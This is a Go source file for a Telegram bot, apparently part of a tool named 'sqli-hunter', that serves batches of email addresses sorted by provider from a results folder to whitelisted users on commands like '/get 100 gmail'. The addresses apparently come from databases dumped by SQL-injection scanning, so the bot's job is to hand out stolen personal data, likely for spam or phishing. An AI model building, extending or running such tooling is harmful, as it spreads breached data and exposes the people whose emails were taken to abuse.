package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

type config struct {
	token      string
	resultsDir string
	maxEmails  int
	allowed    map[int64]bool
}

func main() {
	cfg, err := loadConfig()
	if err != nil {
		log.Fatal(err)
	}

	bot, err := tgbotapi.NewBotAPI(cfg.token)
	if err != nil {
		log.Fatal(err)
	}
	bot.Debug = os.Getenv("TELEGRAM_DEBUG") == "1"
	if len(cfg.allowed) == 0 {
		log.Println("ATTENTION: TELEGRAM_ALLOWED_IDS vide — seul /myid accessible jusqu'à config")
	} else {
		log.Printf("bot @%s — whitelist: %d ID(s)", bot.Self.UserName, len(cfg.allowed))
	}
	log.Printf("emails: %s", results.EmailsDir(cfg.resultsDir))

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 30
	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}
		handleMessage(bot, cfg, update.Message)
	}
}

func handleMessage(bot *tgbotapi.BotAPI, cfg config, msg *tgbotapi.Message) {
	text := strings.TrimSpace(msg.Text)
	if text == "" {
		return
	}

	// /myid toujours accessible pour configurer la whitelist
	if text == "/myid" {
		reply(bot, msg.Chat.ID, fmt.Sprintf("Ton ID Telegram: `%d`\n\nAjoute-le dans `TELEGRAM_ALLOWED_IDS` de tg-bot.env", msg.From.ID))
		return
	}

	if !cfg.authorized(msg.From.ID) {
		reply(bot, msg.Chat.ID, fmt.Sprintf("Accès refusé.\nTon ID: `%d`\nEnvoie /myid pour le récupérer.", msg.From.ID))
		return
	}

	switch {
	case text == "/start", text == "/help":
		reply(bot, msg.Chat.ID, helpText())
	case text == "/list":
		sendList(bot, cfg, msg.Chat.ID)
	case strings.HasPrefix(text, "/get "):
		handleGet(bot, cfg, msg.Chat.ID, strings.TrimSpace(text[len("/get "):]))
	default:
		if count, provider, ok := results.ParseEmailRequest(text); ok {
			sendEmails(bot, cfg, msg.Chat.ID, count, provider)
			return
		}
		reply(bot, msg.Chat.ID, "Format: `100 gmail` ou `/get 100 gmail`")
	}
}

func handleGet(bot *tgbotapi.BotAPI, cfg config, chatID int64, args string) {
	parts := strings.Fields(args)
	if len(parts) != 2 {
		reply(bot, chatID, "Usage: `/get 100 gmail`")
		return
	}
	count, err := strconv.Atoi(parts[0])
	if err != nil || count <= 0 {
		reply(bot, chatID, "Nombre invalide.")
		return
	}
	sendEmails(bot, cfg, chatID, count, parts[1])
}

func sendList(bot *tgbotapi.BotAPI, cfg config, chatID int64) {
	list, err := results.ListProviders(cfg.resultsDir)
	if err != nil {
		reply(bot, chatID, "Erreur: "+err.Error())
		return
	}
	if len(list) == 0 {
		reply(bot, chatID, "Aucun email dans "+results.EmailsDir(cfg.resultsDir))
		return
	}

	var b strings.Builder
	b.WriteString("Fournisseurs disponibles:\n")
	for _, p := range list {
		fmt.Fprintf(&b, "• %s — %d emails\n", p.Provider, p.Count)
	}
	b.WriteString("\nExemple: `100 gmail`")
	reply(bot, chatID, b.String())
}

func sendEmails(bot *tgbotapi.BotAPI, cfg config, chatID int64, count int, providerQuery string) {
	if count > cfg.maxEmails {
		reply(bot, chatID, fmt.Sprintf("Max %d emails par requête.", cfg.maxEmails))
		return
	}

	provider, err := results.ResolveProvider(cfg.resultsDir, providerQuery)
	if err != nil {
		reply(bot, chatID, err.Error())
		return
	}

	emails, err := results.ReadProviderEmails(cfg.resultsDir, provider, count)
	if err != nil {
		reply(bot, chatID, err.Error())
		return
	}

	body := strings.Join(emails, "\n") + "\n"
	filename := fmt.Sprintf("%s_%d.txt", provider, len(emails))
	tmpPath := filepath.Join(os.TempDir(), filename)
	defer os.Remove(tmpPath)

	if err := os.WriteFile(tmpPath, []byte(body), 0644); err != nil {
		reply(bot, chatID, "Erreur écriture.")
		return
	}

	doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(tmpPath))
	doc.Caption = fmt.Sprintf("%d × %s", len(emails), provider)

	if _, err := bot.Send(doc); err != nil {
		reply(bot, chatID, "Envoi échoué: "+err.Error())
		return
	}

	log.Printf("sent %d %s to user %d", len(emails), provider, chatID)
}

func reply(bot *tgbotapi.BotAPI, chatID int64, text string) {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	if _, err := bot.Send(msg); err != nil {
		msg.ParseMode = ""
		_, _ = bot.Send(msg)
	}
}

func helpText() string {
	return strings.TrimSpace(`
Bot emails sqli-hunter (accès whitelist)

Commandes:
/myid — affiche ton ID Telegram
/list — fournisseurs disponibles
/get 100 gmail — envoie un .txt avec 100 emails
100 gmail — raccourci

Config: tg-bot.env (non versionné)
TELEGRAM_BOT_TOKEN=
TELEGRAM_ALLOWED_IDS=123456789
RESULTS_DIR=results
`)
}
